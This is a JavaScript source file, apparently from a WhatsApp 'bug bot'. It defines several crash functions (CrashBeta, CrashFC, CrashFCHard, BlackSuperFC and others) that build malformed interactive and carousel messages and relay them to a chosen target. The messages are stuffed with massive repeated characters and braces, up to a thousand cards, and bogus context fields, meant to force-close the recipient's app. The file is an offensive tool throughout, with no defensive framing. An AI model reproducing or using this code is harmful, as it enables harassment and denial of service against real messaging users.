const VampApiFC = JSON.stringify({
  status: true,
  criador: "Vampire",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

const VampApiFCDelete = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: {
        title: "",
        text: "",
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: [
          {
            header: {
              title: "VampireBOT",
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/56470046_1234739838184215_2259399726208584164_n.enc?ccb=11-4&oh=01_Q5Aa1gEiUUBJfMWRNViPA4iVV8eer8rjQ094ZtYBQW6cJDr_cg&oe=686DCA75&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "+1Tj2Vgmqm1xKaqw0bcM43pXR0UNNiT5W5WHg9GrViU=",
                fileEncSha256: "e4Sy7ofiZsfGliPTP61Gj1jD1HOBDeSyI2yZ6jSYnEc=",
                mediaKey: "GgP4RVlFAJu7RDoS5hVpaQD0Dx9Cm5w+f7SjYjr6Z2s=",
                fileLength: "6806475",
                height: 736,
                width: 736,
                mediaKeyTimestamp: "1749434842",
                caption: " I Try To Look Strong, Even Though Everyone Is Incited To Hate Me",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAxKm5XK0rnZcrvpMkQrbssTJkvSZz9Flq62+DOhlwWztlM2FpNQnW/rknXsyTzzOpxcvuzmC4GetuvlNb4XFPAaVkMRoXFykIyAAFlwJQCysBP//EACYQAAICAgIBBAIDAQAAAAAAAAECAAMREgQhMRNBUVIiYRQjMjP/2gAIAQEAAT8A9ItXsB4irkz0XzjEWhvU1boRqiH1EXjudjjxDVjMCkkCOPTbGJUWDbHEZ6U7VJsW1Yt2T0IqtW9SXYKsZdTw0rdh5UdRq7PSFq9r7wu1WARlT8ys1edOz4lqttNvsJYnQOezKNCyZYeexOWxe9QHzHNrhlL9LOO6nhuu0u/LQZyfeY1Xz0Y5bw3iMu2cwZUjPYjogAdAf3HZie4zA1/4x+5UTnxkQolR8Et7wguf1AMZB76iAsQNoEZSGBBwZq4dm+ZyAQwyYScARSSoKjEQOrFj5M9NyQM9zdhge3vH1U7Dr4Eq44ejdnwobLSrjVsGb7gkL8CV8Xj6VK57ByTCnHRXYkAC3ByJSKGAZe1NuJ6FSuv9m2SVJ+DOSHqdsEn9wBtM5HcRS9mhXOTLeNUEdAGUIPPsTCqLyOOpz/zy5ipSoV3DMXYhR8Ccepb+TbU4OgBIBn8SpRQVLIrNgiMOOPUdA2a2/MfM5D0tx0tVThjHOxJPgThlUbd2j8pdNXt32aF6xa1psBGuAIbUf0n9UKUichf5dr7eUhvUVZezb8oLKy9rep047E49iNTbUzYGcrLQc59oG9j3Nq/qZtX9TNq/qYdMKSJvXn/Jm1f1MLp7LCxM/8QAGxEAAgIDAQAAAAAAAAAAAAAAABEBAhASIEH/2gAIAQIBAT8A5cyTi0yzdeCXFqPtCFj/xAAfEQACAQQDAQEAAAAAAAAAAAAAARECAxIhEDFBEyD/2gAIAQMBAT8AFJuJ5VKSl9eMWm46HpQi2qWo7Z8HV7sdTZJJMbLd/GZ9/eTMmZPj/9k=",
                directPath: "Yq2NFMjEuI5QsApTdjU1SgwyiCYvxoivAArPbBKG/sGWqSMoc4Ve2VT2DFRG824EZmqmu0OhEivj7vmVSJo2mD+PYeuTmcYeb1kedLuCqo6rlhTbhq3XWImnXwl9L9c592fQp4mVBjZP38tg+rQWDGeCv1g3YOAQ3tEN9Ihi0eXy5QaFczSaErdhDuqc/M+0IdnPa3a0C1p6iBjePvb/Tj1ri5SciqY6HWMqAt6ARogeiS8pbK92v+zKlkgPkMtpY/BPcI5CKwHrx/LxCSmpFJpjMQLFkK/FrOssKiLKo5oM+gwc0DJkQu0TbAhYI6p53w2KmBTfZHr0OOU+AJxQDujaNB/DeVD5oCoo5u2d+wuOBtM1iZRS5oNWprQ3ZUQUT8Y6dL3c9yOLjdMpN1ZaAB78u8G6VlWM3puToZLOc+9xKFPx4rKUnn9dLqgfw6deWHvepsr7rXUKyfciR35Vt5UfX72V1Klu/ZpS5/pGwndEWmqGhL0wx5Jby0CtoUmdkJvtBv28JwkllEiM0BIj3CZShekkHESBvO6ZE/Qy+NWZkUkvBP7ZQtfqT5oRP23v+4iDYvllFJhLbGr2wwuHAghDASY0yGy27o9smSztL/QmzdcEc8ocoTEw8+UwjiIO18e/XRpLzWRsZDhUUKj9r5QPL8Q5HzUf5Uvx/P2a6b/7+gRtxKWfv/zZOytofFUfE/+/IiAFrzHdp9aLR/sWRi80nWghW82CACzPcXI7FK+G6FHCkp2JranYdaU5elqRf4rDKRsieL9F1lRFZiSQH5LKjp6qg4kzv1kTv0YM+7tvZ9MHkSRZUIUnU0NosYn+j5A23L7iOMIHKAzYXmqLvrlFHVI1eTbswlrClUS1R4YPfqE/Fa3oN1AAMaviPdPpnuWD+0Cfxq1Y8xwTaNp0NVXvihGfYx9+q3X8VuvMpJHc5PrjOjf/poSHCvIFHERpC7wm2wmYRsueBzMbleclXwXDhGTt54POiV3JIpDQM0LRv/Hz+VoILkPZDZ8S0QybyM9CzZjdzwwyrBrsds7nzPQRDQuLK46tAHjg9n6WneVKhX0hu+OVl98Js0hWpWGQUs0aaR8XnvibwGORWZGy7Bl470qqcQkl+Z2EPwSxCxl/BLKMtntOdH+hzdbxlsbcojlb8kLvEMEntylCDMRbNz9ewI0GyBH8qpJtNuUM+A/OxdaPyYeiFA/3RPvJrZJUJuZLxrCekzvwvLnkH4u5A+XY2c3br9u01Zmm2Qm5O1/rQ2RKTkYtccVNgeEjhx4KsAI8e21AxEE037Gc87cNkRUpiI1OVvJmkqU5NPZ8vemcya0YXrruu8+WZtZ0fjTQeLqNFFQuxDHUzk8QykYj3up+8wew6Hmgrf8/hLzOF9s=",
                scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                scanLengths: [10000, 30000, 40000]
              },
              hasMediaAttachment: true
            },
            body: {
              text: "Not Scammer" + "ꦽ".repeat(100000)
            },
            footer: {
              text: "RiotDb"
            },
            nativeFlowMessage: {
              messageParamsJson: "\n".repeat(10000)
            }
          }
        ]
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    },
  }
};

//================ FUNCTION FORCE CLOSE ================//
async function CrashBeta(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: ' Beta' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'BOT',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                    fileLength: "178006",
                    height: 1,
                    width: 1,
                    mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                    fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                    directPath: "/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749267080",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMEAQYFAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADzz0pLiXNIteDJdW5x50YZ9EmN2e9ayc38jFx8cwKFau5d5urP3XGXNHIxR35TcjMHam/5tnhvSHTux2VaGzRuczhrCMFKBDIFN0DSAOf/xAAlEAACAQQCAgIDAQEAAAAAAAABAgADERIhBDETQRQiQlGRYbH/2gAIAQEAAT8AAvMYOKHQMPYnwWGy4nwTjfISlxVdX3sGfCNgQ0q8VqYBuCIREp39woR+M8jrit9Azz0jlo7nmphdXicimoIUdjc4xJX7Eytx6a0i1/UMXuB7e54gwBvDwwGAL9wcS4YBujPhfprxSaGtESryXraJhEVY6+wJxr+AkLfccvUCaXRjpiUAYAHZi1CCWxBPQPqctgyKQtoi+yNwjRiPTCFSPtAJQJSkw/EmKhyvnGcoSDY76lUs9NAoxEqlXCix1LWlR6ZQBRsdxO4i/wDJTRioWYtlphf1ClwQT95SCUkPlOyJVAIWxFoy2BtG7Mp2yEFTF1W2iJVqMuOMavZg1j1PMQQxJJJ6lSoXJKk7lO5JJ2I707ECMNmI24KhM8thcxGR2s39mND9mMyq1l/s8utQts/7G9wQNC0zI9zytiBeZk9mBoWjNP/EABkRAAIDAQAAAAAAAAAAAAAAAAERABAgIf/aAAgBAgEBPwCd0rAWAKZjMG//xAAfEQEAAgICAgMAAAAAAAAAAAABAAIDERASEyExQUL/2gAIAQMBAT8AgDGs1w1113LPV1G9n5mvVX7ZajMl+xWPA6ay+TbDbqGKv6fc8eOXo1jBSKxssLOuP//Z",
                    scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                    scanLengths: [19972, 38699, 68065, 51270]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Crash" + "ꦽ".repeat(10000)
                },
                footer: {
                  text: "https://VampApiFC.xp"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionJid: ['13135550202@s.whatsapp.net'],
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Shut Up Bitch }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(" Success Sending Bug"));
}

async function CrashFC(target, Ptcp = false) {
  let pesan = generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        body: {
          title: "",
          text: "",
          footer: "Vampire",
          description: "Licked 😋"
        },
        nativeFlowMessage: {
          buttons: [
            {
              buttonParamsJson: JSON.stringify({
                display_text: "payment_info",
                button_id: "",
                type: 1
              })
            },
            {
              buttonParamsJson: JSON.stringify({
                display_text: "‎galaxy_message",
                button_id: "‎",
                type: 1
              })
            }
          ]
        }
      },
      carouselMessage: {
        cards: [
          {
            header: {
              title: 'Crash',
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                fileLength: "178006",
                height: 1,
                width: 1,
                mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                directPath: "/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1749267080",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMEAQYFAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADzz0pLiXNIteDJdW5x50YZ9EmN2e9ayc38jFx8cwKFau5d5urP3XGXNHIxR35TcjMHam/5tnhvSHTux2VaGzRuczhrCMFKBDIFN0DSAOf/xAAlEAACAQQCAgIDAQEAAAAAAAABAgADERIhBDETQRQiQlGRYbH/2gAIAQEAAT8AAvMYOKHQMPYnwWGy4nwTjfISlxVdX3sGfCNgQ0q8VqYBuCIREp39woR+M8jrit9Azz0jlo7nmphdXicimoIUdjc4xJX7Eytx6a0i1/UMXuB7e54gwBvDwwGAL9wcS4YBujPhfprxSaGtESryXraJhEVY6+wJxr+AkLfccvUCaXRjpiUAYAHZi1CCWxBPQPqctgyKQtoi+yNwjRiPTCFSPtAJQJSkw/EmKhyvnGcoSDY76lUs9NAoxEqlXCix1LWlR6ZQBRsdxO4i/wDJTRioWYtlphf1ClwQT95SCUkPlOyJVAIWxFoy2BtG7Mp2yEFTF1W2iJVqMuOMavZg1j1PMQQxJJJ6lSoXJKk7lO5JJ2I707ECMNmI24KhM8thcxGR2s39mND9mMyq1l/s8utQts/7G9wQNC0zI9zytiBeZk9mBoWjNP/EABkRAAIDAQAAAAAAAAAAAAAAAAERABAgIf/aAAgBAgEBPwCd0rAWAKZjMG//xAAfEQEAAgICAgMAAAAAAAAAAAABAAIDERASEyExQUL/2gAIAQMBAT8AgDGs1w1113LPV1G9n5mvVX7ZajMl+xWPA6ay+TbDbqGKv6fc8eOXo1jBSKxssLOuP//Z",
                scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                scanLengths: [19972, 38699, 68065, 51270]
              }
            },
            body: {
              text: "lolol" + "ꦽ".repeat(10000)
            },
            footer: {
              text: "https://VampApiInvis.xp"
            },
            nativeFlowMessage: {
              messageParamsJson: "}".repeat(10000)
            }
          }
        ]
      }
    },
    { quoted: VampApiFCDelete }
  );

  await sock.relayMessage(
    target,
    pesan.message,
    Ptcp
      ? { participant: { jid: target, messageId: pesan.key.id } }
      : {}
  );

  console.log(chalk.blue(" Success Send Bug"));
}

async function CrashFCHard(target) {
    let cards = [];

    for (let r = 0; r < 1000; r++) {
        cards.push({
            body: { 
                text: ' Business' 
            },
            header: {
                title: '𝑹𝑰𝑶𝑻 ',
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
                    fileLength: "98",
                    height: 4,
                    width: 4,
                    mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
                    fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
                    directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749728782"
                },
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: 'VampBOT',
                buttons: [
                    {
                        name: "payment_info",
                        buttonParamsJson: `{}`
                    },
                    {
                        name: "review_order",
                        buttonParamsJson: JSON.stringify({
                            reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
                            order: {
                                status: "completed",
                                order_type: "ORDER"
                            },
                            share_payment_status: true
                        })
                    }
                ]
            }
        });
    }

    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: { 
                        text: ' Mission' 
                    },
                    footer: { 
                        text: 'Just Try To Kill Your System' 
                    },
                    carouselMessage: {
                        cards: cards
                    },
                    contextInfo: {
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {},
                        remoteJid: "@s.whatsapp.net"
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    console.log(chalk.red(" Success Sending Bug"));
}

async function CrashBusiness(target, rep, mention) {
  const space = "}".repeat(rep)
  const PrM = await prepareWAMessageMedia(
    { image: VampCrash },
    { upload: sock.waUploadToServer }
  );

  const cardsCrL = Array.from({ length: 10 }, () => ({
    header: {
      imageMessage: PrM.imageMessage,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      messageParamsJson: space
    }
  }));

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: " 𝗖𝗿𝗮𝘀𝗵𝗲𝗿" },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messagePayload, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    const message = {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "true"
              }
            }
          ]
        }
      }
    };
    await sock.relayMessage(target, message, {});
  }

  console.log(chalk.yellow(" Success Sending Bug"));
}

async function FCAllDev(target, rep) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝑹𝑰𝑶𝑻 ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -666.666,
                degreesLongitude: 666.666666666666,
                name: "𝑹𝑰𝑶𝑻 ",
                address: "\u200D",
              },
            },
            body: {
              text: "𝑹𝑰𝑶𝑻 ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(rep),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
  console.log(chalk.red(" Success Sending Bug"));
}

async function BlackSuperFC(target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./RiotMedia/ShiroCrash.mp4") },
    { upload: sock.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Vampire" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "lolot",
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: " AI Broadcast",
              body: "Attack System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://Vampire.example.com",
              showAdAttribution: false // trigger
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 10; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "BOT"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "Vamp" + "-Id" + Math.floor(Math.random() * 99999), // trigger
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"], // trigger
              externalAdReply: {
                title: "𝑹𝑰𝑶𝑻 System",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Vampire-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(" Success Sending Invisible Force Close"));
}

async function SuperFCNew(target, slide) {
  const cards = [];
  const header = {
     videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
       contextInfo: {},
       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Vampire" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "𝑹𝑰𝑶𝑻",
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: "{ Vampire.lite }",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://nekopoi/care",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let y = 0; y < slide; y++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "WOY TOLOL!!!!!!!"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              isGroupMention: true, 
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "Vampire" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550202@s.whatsapp.net"], // trigger
              externalAdReply: {
                title: "lolot",
                body: "",
                thumbnailUrl: "https://nekopoi/care",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Vampire.{{{{{{{{{.id/kontol?exambling=Vampire",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}